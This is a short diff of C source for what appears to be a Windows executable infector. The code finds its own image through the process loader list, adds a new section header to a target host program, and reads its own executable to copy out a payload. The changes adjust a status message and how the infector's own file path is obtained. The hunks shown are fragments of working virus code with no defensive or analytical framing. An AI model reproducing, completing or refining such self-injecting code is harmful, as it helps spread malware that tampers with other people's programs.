@@ -99,6 +99,7 @@ void payload(void)
     // get entry of current program (return addr and name)
     list = list->Flink;
     LDR_DATA_TABLE_ENTRY *entry = (LDR_DATA_TABLE_ENTRY *)((void*)list - 0x10);
+
     // void *current_image_base = *((void**)((void*)list + 0x20));
     void *current_image_base = entry->DllBase;
 
@@ -290,8 +291,8 @@ inject:{
         RET(inject);
     }
 
-    char format[] = "injecting to: %s";
-    FUNCTION(printf)(format, target); // seems that target contains '\n' already.
+    char format[] = "injecting to: %s\b";
+    FUNCTION(printf)(format, target); 
 
     // ADDING new section header: 
     int sect_start = position + space;  // start of original (host) codes
@@ -368,10 +369,8 @@ get_payload:{
     char s__wfopen[] = "_wfopen"; 
     char s_malloc[] = "malloc"; 
 
-    wchar_t *current_exe_name = ((UNICODE_STRING*)(entry->Reserved4))->Buffer;
-
     wchar_t mode_str[] = L"rb";
-    FILE* payload_file = FUNCTION(_wfopen)(current_exe_name, mode_str);
+    FILE* payload_file = FUNCTION(_wfopen)(entry->FullDllName.Buffer, mode_str);
 
     if(payload_file == NULL) {
         FUNCTION(fclose)(payload_file);
